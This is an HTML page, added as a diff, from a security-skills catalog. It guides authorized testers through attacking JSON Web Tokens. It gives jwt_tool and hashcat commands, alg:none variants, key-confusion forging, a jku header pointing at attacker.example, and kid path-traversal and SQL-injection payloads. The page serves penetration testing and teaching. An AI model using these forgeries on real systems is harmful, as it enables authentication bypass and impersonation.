@@ -1,0 +1,237 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>attacking-jwt — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / attacking-jwt</div>
+  <h1 class="sk">attacking-jwt</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-26</span>
+  </div>
+  <p class="sdesc">Attack JSON Web Tokens by breaking the server&#x27;s signature-verification decision — alg:none and its case variants, RS256-to-HS256 key confusion using the public key as an HMAC secret, weak HMAC secret cracking, jku/x5u/kid/jwk header injection, embedded-key self-signing, claim tampering, and algorithm-confusion bugs like the ES256 psychic-signature CVE. Use when a request contains a token starting with eyJ, when an Authorization: Bearer header carries a JWT, or when a JWT sits in a cookie, localStorage, session storage, or query parameter.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>A JWT is not a credential you are meant to read — it is a signature-verification decision the server makes on bytes you control. Every field, including the <code>alg</code> header that tells the server <em>how</em> to check the signature, is attacker-supplied. The classic failures all come from the server trusting the token's own header to decide how to verify it, or from a secret weak enough to recover offline.</p>
+<p>Only against systems you are authorized to test.</p>
+<h2>When to Use</h2>
+<ul>
+<li>A request carries a token in three base64url parts joined by dots, typically</li>
+</ul>
+<p>starting with <code>eyJ</code> (the encoded <code>{"</code> of the header)</p>
+<ul>
+<li>An <code>Authorization: Bearer &amp;lt;token&amp;gt;</code> header is present</li>
+<li>A session, <code>access_token</code>, <code>id_token</code>, or <code>remember-me</code> value lives in a</li>
+</ul>
+<p>cookie, <code>localStorage</code>, <code>sessionStorage</code>, or a query parameter</p>
+<ul>
+<li>The application authenticates or authorizes based on a signed token rather</li>
+</ul>
+<p>than a server-side session</p>
+<ul>
+<li>You control any claim (<code>sub</code>, <code>role</code>, <code>admin</code>, <code>aud</code>, <code>iss</code>) and want to see</li>
+</ul>
+<p>whether the signature is actually enforced</p>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>The wider web-application methodology</strong> — use <a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a></li>
+<li><strong>API authentication and authorization generally</strong> — use <a class="xref" href="testing-apis.html"><code>testing-apis</code></a></li>
+<li><strong>The cryptographic primitives themselves (HMAC, RSA, ECDSA design)</strong> — use</li>
+</ul>
+<p><a class="xref" href="reviewing-cryptography.html"><code>reviewing-cryptography</code></a></p>
+<ul>
+<li><strong>The OAuth/OIDC flow that issues the token, redirect_uri and PKCE abuse</strong> —</li>
+</ul>
+<p>use <a class="xref" href="attacking-oauth-oidc.html"><code>attacking-oauth-oidc</code></a></p>
+<ul>
+<li>**Cloud IAM tokens (AWS STS, GCP, Azure AD access tokens) as an access</li>
+</ul>
+<p>primitive** — use <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></p>
+<h2>Decode and Inspect First</h2>
+<p>A JWT is <code>header.payload.signature</code>, each part base64url (no padding, <code>-</code> and <code>_</code> instead of <code>+</code> and <code>/</code>). The first two parts are plaintext; only the signature is protected.</p>
+<pre><code># jwt_tool: the fastest way to read a token and see every claim
+python3 jwt_tool.py &lt;token&gt;
+
+# By hand, no tools, no network
+echo '&lt;header&gt;'  | tr '_-' '/+' | base64 -d 2&gt;/dev/null; echo
+echo '&lt;payload&gt;' | tr '_-' '/+' | base64 -d 2&gt;/dev/null; echo</code></pre>
+<p>Read the header offline. Use jwt.io only with a token you are willing to paste into a third-party site — for real engagement tokens, decode locally instead. Note the <code>alg</code>, the <code>kid</code>, and any <code>jku</code>/<code>x5u</code>/<code>jwk</code> header. Note whether <code>exp</code>, <code>iat</code>, and <code>nbf</code> are present, and what <code>iss</code>/<code>aud</code> expect. Every one of these is a lever below.</p>
+<h2>alg:none</h2>
+<p>If the server honours <code>alg: none</code>, it accepts an unsigned token. Strip the signature (keep the trailing dot) and tamper with the payload freely.</p>
+<pre><code># jwt_tool: exploit alg:none in all case variants at once
+python3 jwt_tool.py &lt;token&gt; -X a</code></pre>
+<p>Servers that blocklist the literal string <code>none</code> often miss case variants, because a case-insensitive compare was never applied. Try each:</p>
+<pre><code>none   None   NONE   nOnE   nonE   NonE</code></pre>
+<p>The resulting token is <code>base64url(header).base64url(payload).</code> — header and payload changed, signature empty. Set <code>role</code>/<code>admin</code>/<code>sub</code> to what you want.</p>
+<h2>RS256 to HS256 Key Confusion</h2>
+<p>The highest-value JWT bug. The server verifies with a generic <code>verify(token, key)</code> that picks the algorithm from the token's own header. It was configured with an RSA <strong>public</strong> key for RS256. Switch the header to <code>HS256</code> and the server calls HMAC-SHA256 with that same key as the shared secret — and the RSA public key is not secret. Sign your forged token with it.</p>
+<pre><code># jwt_tool automates the whole confusion once you have the public key (PEM)
+python3 jwt_tool.py &lt;token&gt; -X k -pk public.pem</code></pre>
+<p>You need the public key in the exact PEM bytes the server holds. Get it from:</p>
+<pre><code># 1. A published JWKS endpoint — convert the JWK to PEM
+curl -s https://target/.well-known/jwks.json
+curl -s https://target/jwks.json
+# jwx (or jwt_tool's key tools) turns a JWK into PEM
+jwx jwk format --output-format pem jwks.json
+
+# 2. The TLS certificate, when the signing key reuses the web key pair
+openssl s_client -connect target:443 &lt;/dev/null 2&gt;/dev/null \
+  | openssl x509 -pubkey -noout &gt; public.pem
+
+# 3. Recover it from two tokens by RSA math when no key is published
+#    (rsa_sign2n derives n from two signatures and emits candidate PEMs)
+python3 jwt_forgery.py &lt;token1&gt; &lt;token2&gt;     # CVE-2017-11424; feed a candidate PEM into -X k above</code></pre>
+<p>The PEM must match byte-for-byte, including the trailing newline — a mismatch produces an invalid signature and a false negative. Try the key both with and without the final newline.</p>
+<h2>Weak HMAC Secret Cracking</h2>
+<p>For HS256/384/512 the signature is <code>HMAC(secret, header.payload)</code>. If the secret is a guessable string, recover it offline and then sign anything.</p>
+<pre><code># hashcat mode 16500 is JWT-native — feed the whole token
+hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 16500 token.txt jwt.secrets.list -r rules/best64.rule
+
+# jwt_tool dictionary attack
+python3 jwt_tool.py &lt;token&gt; -C -d /usr/share/wordlists/rockyou.txt</code></pre>
+<p>Try common and framework-default secrets first: <code>secret</code>, <code>secretkey</code>, <code>your-256-bit-secret</code>, <code>changeme</code>, <code>password</code>, the app name, and the <code>jwt.io</code> demo secret. Once cracked, forge with the recovered key:</p>
+<pre><code>python3 jwt_tool.py &lt;token&gt; -I -pc role -pv admin -S hs256 -p '&lt;secret&gt;'</code></pre>
+<p>A recovered signing secret is a full authentication bypass — report it as critical, not as "weak configuration."</p>
+<h2>jku and x5u Header Injection</h2>
+<p><code>jku</code> (JWK Set URL) and <code>x5u</code> (X.509 URL) tell the verifier where to fetch the key. If the server fetches the URL from the token without pinning the host, host your own JWKS and point the header at it, then sign with your matching private key.</p>
+<pre><code># Generate a key pair and a JWKS to serve
+jwx jwk generate --type RSA --keysize 2048 --output-format json &gt; priv.json
+# Publish the public half as /jwks.json on a host you control, then:
+python3 jwt_tool.py &lt;token&gt; -X s -ju https://attacker.example/jwks.json</code></pre>
+<p>Also test bypasses when there is an allowlist on the <code>jku</code> host: the same URL parser tricks as SSRF (<code>@</code>, <code>#</code>, subdomain confusion, open redirects on the trusted host). SSRF-style host validation gaps apply directly — see <a class="xref" href="exploiting-ssrf.html"><code>exploiting-ssrf</code></a>.</p>
+<h2>kid Header Injection</h2>
+<p><code>kid</code> selects which key to use and is frequently used to build a file path or a database lookup — both are injectable.</p>
+<pre><code># Path traversal to a file with known contents, then sign with those bytes.
+# /dev/null is empty, so the HMAC key is the empty string.
+{"alg":"HS256","kid":"../../../../../../dev/null"}
+# Sign with an empty secret:
+python3 jwt_tool.py &lt;token&gt; -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
+
+# A predictable static file (e.g. a public CSS/JS asset) works the same way:
+# fetch its bytes, use them as the HMAC secret.
+
+# SQL injection in the kid lookup — return an attacker-chosen key
+{"alg":"HS256","kid":"nonexistent' UNION SELECT 'attackerkey'-- -"}
+# then sign with 'attackerkey'</code></pre>
+<p><code>kid</code> also reaches command injection and LFI where the value is passed to a shell or file read unsanitized.</p>
+<h2>Embedded jwk Header</h2>
+<p>A token may carry its own public key in a <code>jwk</code> header. A verifier that trusts that embedded key instead of its configured key will accept anything you self-sign — you supply both the key and the signature.</p>
+<pre><code># jwt_tool injects a self-generated jwk and signs with its private half
+python3 jwt_tool.py &lt;token&gt; -X i</code></pre>
+<p>This is the "bring your own key" variant of the header-injection family: the server should ignore token-supplied keys entirely.</p>
+<h2>Claim Tampering</h2>
+<p>Once you can produce a signature the server accepts (via any bug above, or if signatures are simply never checked), the claims are yours:</p>
+<ul>
+<li><code>sub</code> / <code>user_id</code> — impersonate another principal, including internal IDs</li>
+<li><code>role</code> / <code>roles</code> / <code>groups</code> / <code>scope</code> / <code>admin</code> / <code>isAdmin</code> — privilege</li>
+</ul>
+<p>escalation; try both boolean <code>true</code> and string <code>"true"</code>, and array vs scalar</p>
+<ul>
+<li><code>exp</code> — extend a captured token's lifetime; remove it entirely if unenforced</li>
+<li><code>aud</code> — reuse a token minted for one service against another</li>
+<li><code>iss</code> — pair with <code>jku</code>/<code>kid</code> tricks to assert a trusted issuer</li>
+<li><code>nbf</code> / <code>iat</code> — bypass not-before windows</li>
+</ul>
+<p>Always test the null case first: does the server reject a token whose signature you flipped a single byte in? If not, no forgery skill is required.</p>
+<h2>Algorithm Confusion Beyond RS/HS</h2>
+<ul>
+<li><strong>ES256 (ECDSA)</strong> — the "psychic signature" bug, CVE-2022-21449, affects Java</li>
+</ul>
+<p>15–18: an ECDSA signature of <code>r=0, s=0</code> verifies against any key. A token with <code>alg: ES256</code> and a signature of two zero values passes on vulnerable JDKs with no key knowledge at all.</p>
+<pre><code># jwt_tool includes a check for the psychic/zero-signature ECDSA bypass
+python3 jwt_tool.py &lt;token&gt; -X p</code></pre>
+<ul>
+<li><strong>EdDSA / ES384 / PS256</strong> — the same RS/HS confusion class applies whenever</li>
+</ul>
+<p>one verify function serves asymmetric and symmetric algorithms; try swapping to any HMAC variant.</p>
+<ul>
+<li><strong>Algorithm downgrade</strong> — a token minted with a strong alg accepted when</li>
+</ul>
+<p>re-presented with a weaker one the server still supports.</p>
+<h2>Token Lifetime and Revocation</h2>
+<p>Signature aside, stateless JWTs have design weaknesses to probe:</p>
+<ul>
+<li><strong>No revocation</strong> — a stolen or logged-out token stays valid until <code>exp</code></li>
+</ul>
+<p>because there is no server-side session to kill. Test whether logout, password change, or role change actually invalidates an outstanding token.</p>
+<ul>
+<li><strong>Long or absent <code>exp</code></strong> — capture a token and replay it hours or days later.</li>
+<li><strong><code>exp</code> not enforced</strong> — strip or backdate <code>exp</code> and see if it is checked.</li>
+<li><strong>Missing <code>aud</code>/<code>iss</code> checks</strong> — a token accepted across services or tenants.</li>
+<li><strong>Tokens in logs, referrers, URLs</strong> — a JWT in a query string leaks into</li>
+</ul>
+<p>access logs, proxies, and <code>Referer</code> headers.</p>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"The token is signed, so it can't be tampered with."</em> Signed by whom, and</li>
+</ul>
+<p>verified how? alg:none, key confusion, and header injection all defeat a "signed" token without knowing the real key.</p>
+<ul>
+<li><em>"We use RS256, which is asymmetric and secure."</em> RS256 is the precondition</li>
+</ul>
+<p>for the HS256 confusion attack — the public key becomes the HMAC secret.</p>
+<ul>
+<li><em>"The signing secret is strong enough."</em> Prove it: run hashcat -m 16500 and</li>
+</ul>
+<p>the common-secret list. "Strong enough" is an untested assumption until it survives a crack.</p>
+<ul>
+<li><em>"We block alg:none."</em> Do you block <code>None</code>, <code>NONE</code>, and <code>nOnE</code>? Blocklists</li>
+</ul>
+<p>that are not case-insensitive miss the variants.</p>
+<ul>
+<li><em>"kid is just an internal key identifier."</em> It is attacker-supplied input</li>
+</ul>
+<p>flowing into a file path or SQL query — traversal and injection apply.</p>
+<ul>
+<li><em>"jku points to our own domain."</em> Validate that with URL-parser and</li>
+</ul>
+<p>open-redirect bypasses before believing it; the same tricks as SSRF work.</p>
+<ul>
+<li><em>"It expires quickly, so replay isn't a concern."</em> Verify <code>exp</code> is actually</li>
+</ul>
+<p>enforced, and remember there is no revocation — a stolen token is valid for its whole lifetime regardless.</p>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1606/">T1606</a> Forge Web Credentials — see also <a class="xref" href="attacking-oauth-oidc.html"><code>attacking-oauth-oidc</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a> — the surrounding web methodology</li>
+<li><a class="xref" href="testing-apis.html"><code>testing-apis</code></a> — API authentication and authorization at large</li>
+<li><a class="xref" href="attacking-oauth-oidc.html"><code>attacking-oauth-oidc</code></a> — the OAuth/OIDC flow that issues the token</li>
+<li><a class="xref" href="reviewing-cryptography.html"><code>reviewing-cryptography</code></a> — the HMAC/RSA/ECDSA primitives themselves</li>
+<li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — severity when a forgery bypasses auth</li>
+<li>jwt_tool (ticarpi), hashcat (-m 16500), jwt.io (offline/paste-aware), jwx</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
